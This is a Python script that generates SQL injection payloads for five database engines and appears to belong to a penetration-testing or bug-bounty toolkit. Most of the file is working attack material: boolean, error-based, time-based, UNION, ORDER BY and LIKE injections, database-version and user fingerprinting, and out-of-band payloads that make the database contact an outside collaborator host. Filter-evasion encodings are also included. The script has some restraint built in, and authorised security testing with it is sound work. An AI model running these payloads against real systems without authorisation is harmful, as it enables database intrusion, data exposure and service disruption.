#!/usr/bin/env python3
"""Generate SQL injection detection / proof payloads (offline). Also imported by sqli_probe.py.

Usage:
  sqli_payloads.py [--dbms mysql,postgres,mssql,oracle,sqlite|all] [--contexts num,sq,dq,...|all]
                   [--families break,boolean,arith,concat,error,time,union,orderby,limit,like,in,oob,proof]
                   [--sleep 3] [--columns 4] [--max-columns 12] [--collab YOUR.oastify.com] [--col name]
                   [--write-context] [--transform comment,versioned,case,url,double,unicode,fullwidth,html,newline]
                   [--json-escape]

Each payload is APPENDED to the parameter's original value (id=39 -> id=39' AND '1'='1), except the
orderby / limit / like families, which REPLACE the value. arith/concat use {V} (number) and {A}{B} (string halves).
Output TSV: family, context, dbms, variant, class, payload.
Classes: D detect (default), P proof (one scalar such as version), X server-side reach (gated).
Markers: error payloads evaluate 'bbsq'||7*7 -> look for "bbsq49"; UNION markers evaluate 7*60607 -> "424249".
--write-context (UPDATE/INSERT/DELETE sinks): balanced payloads only - no comment terminators, no stacked
queries, no OR - so the WHERE clause can never be cut off or widened.
"""
import argparse
import re
import sys
from urllib.parse import quote

DBMS = ["mysql", "postgres", "mssql", "oracle", "sqlite"]
# context: (break-out prefix, balanced tail that re-opens what the prefix closed)
CONTEXTS = {
    "num": ("", ""),
    "sq": ("'", " AND 'bq'='bq"),
    "dq": ('"', ' AND "bq"="bq'),
    "num-paren": (")", " AND (1=1"),
    "sq-paren": ("')", " AND ('bq'='bq"),
    "dq-paren": ('")', ' AND ("bq"="bq'),
    "num-2paren": ("))", " AND ((1=1"),
    "sq-2paren": ("'))", " AND (('bq'='bq"),
}
COMMENTS = {"mysql": ["-- -", "#"], "postgres": ["--"], "mssql": ["--"], "oracle": ["--"], "sqlite": ["--"]}
TIME = {  # expression usable as AND <expr>; uncorrelated subquery -> evaluated once, not per row
    "mysql": "(SELECT * FROM (SELECT(SLEEP({N})))bbsq)",
    "postgres": "1=(SELECT 1 FROM PG_SLEEP({N}))",
    "oracle": "1=DBMS_PIPE.RECEIVE_MESSAGE('bbsq',{N})",
    "sqlite": "1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({N}00000000/2))))",
}
TIME_STACKED = {"mssql": "; WAITFOR DELAY '0:0:{N}'", "postgres": "; SELECT PG_SLEEP({N})"}
TIME_EXTRA = {  # per-row forms from community lists - may sleep once per scanned row; use sparingly
    "mysql": ["'XOR(IF(NOW()=SYSDATE(),SLEEP({N}),0))XOR'", " AND SLEEP({N})", "' AND SLEEP({N}) AND '1'='1"],
    "postgres": ["'||PG_SLEEP({N})||'"],
    "oracle": ["'||DBMS_PIPE.RECEIVE_MESSAGE('bbsq',{N})||'"],
    "mssql": ["';IF(1=1) WAITFOR DELAY '0:0:{N}'--"],
}
ERROR = {
    "mysql": ["EXTRACTVALUE(1,CONCAT(0x7e,'bbsq',7*7))", "UPDATEXML(1,CONCAT(0x7e,'bbsq',7*7),1)"],
    "postgres": ["1=CAST('bbsq'||7*7 AS INT)"],
    "mssql": ["1=CONVERT(INT,'bbsq'+CAST(7*7 AS VARCHAR(4)))"],
    "oracle": ["1=CTXSYS.DRITHSX.SN(1,'bbsq'||7*7)",
               "1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'bbsq'||7*7||CHR(62))) FROM dual)"],
}
PROOF = {  # class P: one scalar fingerprint, nothing from application tables
    "mysql": ["EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e,CURRENT_USER()))"],
    "postgres": ["1=CAST(VERSION() AS INT)", "1=CAST(CURRENT_USER||'@'||CURRENT_DATABASE() AS INT)"],
    "mssql": ["1=CONVERT(INT,@@VERSION)", "1=CONVERT(INT,SYSTEM_USER+'@'+DB_NAME())"],
    "oracle": ["1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))"],
    "sqlite": ["(union) SQLITE_VERSION()"],
}
BS = chr(92)
OOB = {  # (class, payload) - your own collaborator only; {C} = collaborator host
    "mssql": [("D", "; EXEC master..xp_dirtree '" + BS * 2 + "{C}" + BS + "bbsq'")],
    "oracle": [("D", " AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS('bbsq.{C}') FROM dual)"),
               ("D", " AND 1=(SELECT EXTRACTVALUE(XMLType('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM "
                     "\"http://bbsq.{C}/\">%x;]>'),'/l') FROM dual)")],
    "postgres": [("D", "; SELECT dblink_connect('host=bbsq.{C} user=bbsq dbname=bbsq')")],
    "mysql": [("X", " AND LOAD_FILE(CONCAT('" + BS * 4 + "bbsq.{C}" + BS * 2 + "a'))")],   # Windows DB hosts only
}
KEYWORDS = (r"\b(SELECT|UNION|AND|OR|FROM|WHERE|ORDER|BY|SLEEP|WAITFOR|DELAY|CAST|CONVERT|CONCAT|NULL|CASE|WHEN|"
            r"THEN|ELSE|END|LIKE|IN|INT|AS|IF|EXEC)\b")


def _variants(prefix, cond, tail, dbms, write, stacked=False):
    """Yield (variant_label, payload) for a condition in a context."""
    if not stacked:
        yield "balanced", f"{prefix} AND {cond}{tail}"
    if write:
        return
    for c in COMMENTS.get(dbms, ["--"]):
        yield f"comment{c.strip()}", (f"{prefix}{cond}{c}" if stacked else f"{prefix} AND {cond}{c}")


def build(dbms_list=None, contexts=None, families=None, sleep=3, columns=None, max_columns=12, collab=None,
          col="id", write=False):
    dbms_list = dbms_list or DBMS
    contexts = contexts or list(CONTEXTS)
    fam = set(families or ["break", "boolean", "arith", "concat", "error", "time"])
    out = []

    def add(f, ctx, d, v, cls, p):
        out.append(dict(family=f, context=ctx, dbms=d, variant=v, cls=cls, payload=p))

    N = str(sleep)
    if "break" in fam:   # break vs repair pairs: an error on break that disappears on repair is a signal
        for b, r in (("'", "''"), ('"', '""'), (BS, BS * 2), ("')", "')-- -"), ("'))", "'))-- -"), ("`", "``"),
                     ("'\"", "'\"'\""), (";", ""), ("[]", "")):
            add("break", "any", "any", "break", "D", b)
            if r and not (write and "--" in r):
                add("break", "any", "any", "repair", "D", r)
    for ctx in contexts:
        pre, tail = CONTEXTS[ctx]
        if "boolean" in fam:
            d = "mysql" if (write or "mysql" in dbms_list) else dbms_list[0]
            for (vt, pt), (vf, pf) in zip(_variants(pre, "1=1", tail, d, write), _variants(pre, "1=2", tail, d, write)):
                add("boolean", ctx, "any", f"true/{vt}", "D", pt)
                add("boolean", ctx, "any", f"false/{vf}", "D", pf)
        if "error" in fam:
            for d in dbms_list:
                for e in ERROR.get(d, []):
                    for v, p in _variants(pre, e, tail, d, write):
                        add("error", ctx, d, v, "D", p)
        if "time" in fam:
            for d in dbms_list:
                if d in TIME:
                    for v, p in _variants(pre, TIME[d].replace("{N}", N), tail, d, write):
                        add("time", ctx, d, v, "D", p)
                if d in TIME_STACKED and not write:
                    for v, p in _variants(pre, TIME_STACKED[d].replace("{N}", N), tail, d, write, stacked=True):
                        add("time-stacked", ctx, d, v, "D", p)
        if "time-extra" in fam and not write:
            for d in dbms_list:
                for e in TIME_EXTRA.get(d, []):
                    add("time-extra", "raw", d, "per-row", "D", e.replace("{N}", N))
        if "proof" in fam:
            for d in dbms_list:
                for e in PROOF.get(d, []):
                    if e.startswith("(union)"):
                        add("proof", ctx, d, "union-only", "P", e)
                        continue
                    for v, p in _variants(pre, e, tail, d, write):
                        add("proof", ctx, d, v, "P", p)
        if "oob" in fam and collab and not write:
            for d in dbms_list:
                for cls, e in OOB.get(d, []):
                    e = e.replace("{C}", collab)
                    for c in COMMENTS.get(d, ["--"]):
                        add("oob", ctx, d, f"comment{c.strip()}", cls, f"{pre}{e}{c}")
        if "union" in fam and not write:
            c = "-- -"
            for n in range(1, max_columns + 1):
                add("union-orderby", ctx, "any", f"n={n}", "D", f"{pre} ORDER BY {n}{c}")
            for n in range(1, max_columns + 1):
                nulls = ",".join(["NULL"] * n)
                add("union-null", ctx, "any", f"n={n}", "D", f"{pre} UNION SELECT {nulls}{c}")
                add("union-null", ctx, "oracle", f"n={n}", "D", f"{pre} UNION SELECT {nulls} FROM dual{c}")
            if columns:
                for i in range(columns):
                    cols = ["NULL"] * columns
                    cols[i] = "(7*60607)"
                    add("union-marker", ctx, "any", f"pos={i + 1}/{columns}", "D",
                        f"{pre} UNION SELECT {','.join(cols)}{c}")
    if "arith" in fam:
        add("arith", "num", "any", "equal-if-evaluated", "D", "{V+1}-1")
        add("arith", "num", "any", "differs-if-evaluated", "D", "{V+1}-0")
        add("arith", "num", "any", "equal-if-evaluated", "D", "{V}*1")
    if "concat" in fam:   # split the original string value in two and re-join it with SQL syntax
        add("concat", "sq", "postgres/oracle/sqlite", "equal-if-evaluated", "D", "{A}'||'{B}")
        add("concat", "sq", "mysql", "equal-if-evaluated", "D", "{A}' '{B}")
        add("concat", "sq", "mssql", "equal-if-evaluated", "D", "{A}'+'{B}")
        add("concat", "sq", "any", "differs-control", "D", "{A}'~'{B}")
    if "orderby" in fam:   # injection point is ORDER BY <value>; the value is replaced
        for v, p in (("baseline-asc", f"{col} ASC"), ("baseline-desc", f"{col} DESC"), ("index-1", "1"),
                     ("index-out-of-range", "9999"),
                     ("true", f"(CASE WHEN (1=1) THEN {col} ELSE (SELECT 1 UNION SELECT 2) END)"),
                     ("false", f"(CASE WHEN (1=2) THEN {col} ELSE (SELECT 1 UNION SELECT 2) END)"),
                     ("mysql-if-true", f"IF(1=1,{col},(SELECT 1 UNION SELECT 2))"),
                     ("mysql-if-false", f"IF(1=2,{col},(SELECT 1 UNION SELECT 2))"),
                     ("time-mysql", f"(SELECT * FROM (SELECT(SLEEP({N})))bbsq)"),
                     ("time-postgres", f"(SELECT 1 FROM PG_SLEEP({N}))"),
                     ("subquery", f"{col},(SELECT 1)")):
            add("orderby", "replace", "any", v, "D", p)
    if "limit" in fam:   # LIMIT/OFFSET value replaced
        for v, p in (("subquery", "(SELECT 1)"), ("true", "(CASE WHEN 1=1 THEN 1 ELSE 2 END)"),
                     ("false", "(CASE WHEN 1=2 THEN 1 ELSE 2 END)"), ("time-postgres", f"(SELECT 1 FROM PG_SLEEP({N}))"),
                     ("mysql5-procedure", "1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,'bbsq',7*7)),1)"),
                     ("arith", "2-1")):
            add("limit", "replace", "any", v, "D", p)
    if "like" in fam:
        for v, p in (("wildcard-all", "%"), ("wildcard-one", "_"), ("true", "%' AND '1'='1' AND '%'='"),
                     ("false", "%' AND '1'='2' AND '%'='"), ("escape-probe", BS + "%"),
                     ("time-mysql", f"%' AND (SELECT * FROM (SELECT(SLEEP({N})))bbsq) AND '%'='")):
            add("like", "replace", "any", v, "D", p)
    if "in" in fam:
        for v, p in (("true", ") AND (1=1"), ("false", ") AND (1=2"), ("subquery", ",(SELECT 1)"),
                     ("sq-true", "') AND ('1'='1"), ("sq-false", "') AND ('1'='2")):
            add("in", "append", "any", v, "D", p)
    return out


def _case(m):
    return "".join(ch.upper() if i % 2 == 0 else ch.lower() for i, ch in enumerate(m.group(0)))


def transform(p, name):
    if name == "comment":
        return p.replace(" ", "/**/")
    if name == "newline":
        return p.replace(" ", "\n")
    if name == "versioned":
        return re.sub(KEYWORDS, lambda m: f"/*!50000{m.group(0)}*/", p, flags=re.I)
    if name == "case":
        return re.sub(KEYWORDS, _case, p, flags=re.I)
    if name == "url":      # keyword letters and quotes as %XX (raw - the sender must not re-encode '%')
        return re.sub(KEYWORDS + r"|'", lambda m: "".join(f"%{ord(c):02X}" for c in m.group(0)), p, flags=re.I)
    if name == "double":
        return re.sub(KEYWORDS + r"|'| ", lambda m: "".join(f"%25{ord(c):02X}" for c in m.group(0)), p, flags=re.I)
    if name == "unicode":  # IIS-style %u encoding
        return p.replace("'", "%u0027").replace(" ", "%u0020")
    if name == "fullwidth":  # full-width apostrophe for backends that NFKC-normalise after filtering
        return p.replace("'", quote(chr(0xFF07))).replace(" ", "%20")
    if name == "html":
        return "".join(f"&#{ord(c)};" if c in "'\"<> " else c for c in p)
    raise ValueError(f"unknown transform {name}")


RAW_TRANSFORMS = {"url", "double", "unicode", "fullwidth"}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dbms", default="all")
    ap.add_argument("--contexts", default="all")
    ap.add_argument("--families", default="break,boolean,arith,concat,error,time")
    ap.add_argument("--sleep", type=int, default=3)
    ap.add_argument("--columns", type=int)
    ap.add_argument("--max-columns", type=int, default=12)
    ap.add_argument("--collab")
    ap.add_argument("--col", default="id")
    ap.add_argument("--write-context", action="store_true")
    ap.add_argument("--transform", default="")
    ap.add_argument("--json-escape", action="store_true")
    a = ap.parse_args()
    if not 1 <= a.sleep <= 10:
        sys.exit("--sleep must be 1..10")
    dl = DBMS if a.dbms == "all" else [d.strip() for d in a.dbms.split(",")]
    cl = list(CONTEXTS) if a.contexts == "all" else [c.strip() for c in a.contexts.split(",")]
    for d in dl:
        if d not in DBMS:
            sys.exit(f"unknown dbms {d}; choose from {','.join(DBMS)}")
    for c in cl:
        if c not in CONTEXTS:
            sys.exit(f"unknown context {c}; choose from {','.join(CONTEXTS)}")
    rows = build(dl, cl, [f.strip() for f in a.families.split(",")], a.sleep, a.columns, a.max_columns, a.collab,
                 a.col, a.write_context)
    tr = [t.strip() for t in a.transform.split(",") if t.strip()]
    print("family\tcontext\tdbms\tvariant\tclass\tpayload")
    seen = set()
    for r in rows:
        p = r["payload"]
        for t in tr:
            p = transform(p, t)
        if a.json_escape:
            p = p.replace(BS, BS * 2).replace('"', BS + '"')
        p = p.replace("\n", "\\n") if "\n" in p else p
        if p in seen:
            continue
        seen.add(p)
        print(f"{r['family']}\t{r['context']}\t{r['dbms']}\t{r['variant']}\t{r['cls']}\t{p}")


if __name__ == "__main__":
    main()
